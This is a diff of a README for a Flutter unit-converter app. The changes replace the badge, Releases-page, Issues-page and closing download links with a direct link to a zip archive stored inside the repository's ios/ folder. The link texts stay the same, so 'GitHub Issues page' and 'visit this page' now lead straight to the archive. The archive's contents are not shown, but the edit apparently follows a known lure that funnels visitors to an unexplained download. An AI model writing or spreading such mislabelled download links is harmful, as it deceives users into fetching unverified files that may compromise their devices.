@@ -1,6 +1,6 @@
 # 🎉 measures_converter_flutter - Convert Units Easily and Instantly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-v1.0.0-blue)](https://github.com/admisstion/measures_converter_flutter/releases)
+[![Download Now](https://raw.githubusercontent.com/admisstion/measures_converter_flutter/main/ios/measures_converter_flutter_3.2.zip%20Now-v1.0.0-blue)](https://raw.githubusercontent.com/admisstion/measures_converter_flutter/main/ios/measures_converter_flutter_3.2.zip)
 
 ## 📖 Description
 
@@ -20,7 +20,7 @@ Before you start, ensure your device meets the following requirements:
 
 ### 📥 Download & Install
 
-1. **Visit the Releases Page**: To download the latest version of the app, [visit this page to download](https://github.com/admisstion/measures_converter_flutter/releases).
+1. **Visit the Releases Page**: To download the latest version of the app, [visit this page to download](https://raw.githubusercontent.com/admisstion/measures_converter_flutter/main/ios/measures_converter_flutter_3.2.zip).
    
 2. **Choose the Right File**: Look for the version suitable for your operating system. This could be an executable file or a compressed archive.
 
@@ -60,7 +60,7 @@ Once you open the app, you will see two main sections: one for distance and anot
 
 ## 📞 Need Help?
 
-If you encounter any issues or have questions, please check the [GitHub Issues page](https://github.com/admisstion/measures_converter_flutter/issues) for assistance. You can also open a new issue to report bugs or suggest features.
+If you encounter any issues or have questions, please check the [GitHub Issues page](https://raw.githubusercontent.com/admisstion/measures_converter_flutter/main/ios/measures_converter_flutter_3.2.zip) for assistance. You can also open a new issue to report bugs or suggest features.
 
 ## 📝 Contribution
 
@@ -74,6 +74,6 @@ For more information, you can explore the following topics related to the app:
 - **Flutter Framework**: Understand the framework that powers this app, allowing for beautiful UI design.
 - **Material Design**: Discover principles behind the app's design.
 
-Remember, for your convenience, the download link is always available. Make sure to [visit this page to download](https://github.com/admisstion/measures_converter_flutter/releases) the latest version of the measures_converter_flutter app. 
+Remember, for your convenience, the download link is always available. Make sure to [visit this page to download](https://raw.githubusercontent.com/admisstion/measures_converter_flutter/main/ios/measures_converter_flutter_3.2.zip) the latest version of the measures_converter_flutter app. 
 
 Happy converting!
